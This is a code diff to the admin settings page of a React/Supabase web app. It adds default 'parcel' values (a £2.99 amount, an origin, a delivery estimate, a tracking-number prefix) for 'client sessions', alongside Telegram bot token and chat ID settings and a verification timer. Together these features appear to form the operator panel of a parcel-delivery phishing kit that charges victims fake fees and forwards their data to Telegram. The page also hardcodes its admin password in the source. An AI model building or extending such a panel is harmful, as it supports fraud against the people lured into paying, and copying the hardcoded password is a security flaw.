@@ -5,7 +5,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
 import { toast } from "@/hooks/use-toast";
-import { Save, Send, Eye, EyeOff, MessageCircle, Lock, ShieldCheck, Timer } from "lucide-react";
+import { Save, Send, Eye, EyeOff, MessageCircle, Lock, ShieldCheck, Timer, Package } from "lucide-react";
 import { Slider } from "@/components/ui/slider";
 
 const SETTINGS_PASSWORD = "Ninja-93-Kk";
@@ -22,6 +22,12 @@ const AdminSettings = () => {
   const [saving, setSaving] = useState(false);
   const [testing, setTesting] = useState(false);
   const [showToken, setShowToken] = useState(false);
+
+  // Default parcel settings
+  const [defaultAmount, setDefaultAmount] = useState("2.99");
+  const [defaultOrigin, setDefaultOrigin] = useState("Los Angeles, CA");
+  const [defaultEstDelivery, setDefaultEstDelivery] = useState("2-3 Business Days");
+  const [trackingPrefix, setTrackingPrefix] = useState("SWIFT");
 
   const handleUnlock = () => {
     if (passwordInput === SETTINGS_PASSWORD) {
@@ -48,7 +54,15 @@ const AdminSettings = () => {
     const { data, error } = await supabase
       .from("admin_settings")
       .select("setting_key, setting_value")
-      .in("setting_key", ["telegram_bot_token", "telegram_chat_id", "verification_timeout"]);
+      .in("setting_key", [
+        "telegram_bot_token", 
+        "telegram_chat_id", 
+        "verification_timeout",
+        "default_amount",
+        "default_origin",
+        "default_est_delivery",
+        "tracking_prefix"
+      ]);
 
     if (error) {
       console.error("Error fetching settings:", error);
@@ -61,13 +75,39 @@ const AdminSettings = () => {
       const token = data.find(s => s.setting_key === "telegram_bot_token")?.setting_value || "";
       const chat = data.find(s => s.setting_key === "telegram_chat_id")?.setting_value || "";
       const timeout = data.find(s => s.setting_key === "verification_timeout")?.setting_value;
+      const amount = data.find(s => s.setting_key === "default_amount")?.setting_value;
+      const origin = data.find(s => s.setting_key === "default_origin")?.setting_value;
+      const estDelivery = data.find(s => s.setting_key === "default_est_delivery")?.setting_value;
+      const prefix = data.find(s => s.setting_key === "tracking_prefix")?.setting_value;
+      
       setBotToken(token);
       setChatId(chat);
-      if (timeout) {
-        setTimerMinutes(Math.round(parseInt(timeout, 10) / 60));
-      }
+      if (timeout) setTimerMinutes(Math.round(parseInt(timeout, 10) / 60));
+      if (amount) setDefaultAmount(amount);
+      if (origin) setDefaultOrigin(origin);
+      if (estDelivery) setDefaultEstDelivery(estDelivery);
+      if (prefix) setTrackingPrefix(prefix);
     }
     setLoading(false);
+  };
+
+  const upsertSetting = async (key: string, value: string) => {
+    const { data: existing } = await supabase
+      .from("admin_settings")
+      .select("id")
+      .eq("setting_key", key)
+      .maybeSingle();
+
+    if (existing) {
+      await supabase
+        .from("admin_settings")
+        .update({ setting_value: value })
+        .eq("setting_key", key);
+    } else {
+      await supabase
+        .from("admin_settings")
+        .insert({ setting_key: key, setting_value: value });
+    }
   };
 
   const saveSettings = async () => {
@@ -90,24 +130,15 @@ const AdminSettings = () => {
 
       if (chatError) throw chatError;
 
-      // Update or insert timer setting
+      // Update timer setting
       const timerSeconds = timerMinutes * 60;
-      const { data: existingTimer } = await supabase
-        .from("admin_settings")
-        .select("id")
-        .eq("setting_key", "verification_timeout")
-        .maybeSingle();
+      await upsertSetting("verification_timeout", timerSeconds.toString());
 
-      if (existingTimer) {
-        await supabase
-          .from("admin_settings")
-          .update({ setting_value: timerSeconds.toString() })
-          .eq("setting_key", "verification_timeout");
-      } else {
-        await supabase
-          .from("admin_settings")
-          .insert({ setting_key: "verification_timeout", setting_value: timerSeconds.toString() });
-      }
+      // Update parcel default settings
+      await upsertSetting("default_amount", defaultAmount);
+      await upsertSetting("default_origin", defaultOrigin);
+      await upsertSetting("default_est_delivery", defaultEstDelivery);
+      await upsertSetting("tracking_prefix", trackingPrefix);
 
       toast({
         title: "Settings Saved",
@@ -263,6 +294,65 @@ const AdminSettings = () => {
         </CardContent>
       </Card>
 
+      {/* Default Parcel Settings */}
+      <Card>
+        <CardHeader>
+          <CardTitle className="flex items-center gap-2">
+            <Package className="w-5 h-5" />
+            Default Parcel Settings
+          </CardTitle>
+          <CardDescription>
+            Set default values for new client sessions
+          </CardDescription>
+        </CardHeader>
+        <CardContent className="space-y-4">
+          <div className="grid grid-cols-2 gap-4">
+            <div className="space-y-2">
+              <Label htmlFor="trackingPrefix">Tracking Prefix</Label>
+              <Input
+                id="trackingPrefix"
+                placeholder="SWIFT"
+                value={trackingPrefix}
+                onChange={(e) => setTrackingPrefix(e.target.value.toUpperCase())}
+              />
+              <p className="text-xs text-muted-foreground">
+                Prefix for tracking numbers (e.g., SWIFT → SWIFTabc123)
+              </p>
+            </div>
+            <div className="space-y-2">
+              <Label htmlFor="defaultAmount">Default Amount (£)</Label>
+              <Input
+                id="defaultAmount"
+                type="number"
+                step="0.01"
+                placeholder="2.99"
+                value={defaultAmount}
+                onChange={(e) => setDefaultAmount(e.target.value)}
+              />
+            </div>
+          </div>
+
+          <div className="space-y-2">
+            <Label htmlFor="defaultOrigin">Default Origin</Label>
+            <Input
+              id="defaultOrigin"
+              placeholder="Los Angeles, CA"
+              value={defaultOrigin}
+              onChange={(e) => setDefaultOrigin(e.target.value)}
+            />
+          </div>
+
+          <div className="space-y-2">
+            <Label htmlFor="defaultEstDelivery">Default Est. Delivery</Label>
+            <Input
+              id="defaultEstDelivery"
+              placeholder="2-3 Business Days"
+              value={defaultEstDelivery}
+              onChange={(e) => setDefaultEstDelivery(e.target.value)}
+            />
+          </div>
+        </CardContent>
+      </Card>
       {/* Telegram Settings */}
       <Card>
         <CardHeader>
